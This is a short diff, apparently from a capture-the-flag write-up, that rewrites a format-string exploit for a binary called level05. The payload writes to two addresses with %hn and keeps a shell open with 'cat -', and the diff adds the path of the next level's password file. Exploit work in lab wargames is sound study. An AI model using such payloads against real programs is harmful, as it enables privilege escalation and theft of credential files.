@@ -21,9 +21,6 @@ EOF
 low = 54356 
 high = 65535
 
-(python -c 'print \
-"\xe0\x97\x04\x08" \
-"\xe2\x97\x04\x08" \
-"%54348c%10$hn" \
-"%11179c%11$hn"' ; cat -) | ./level05
+(python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08%56234c%10$hn%9293c%11$hn"'; cat -) | ./level05
 
+/home/users/level06/.pass\
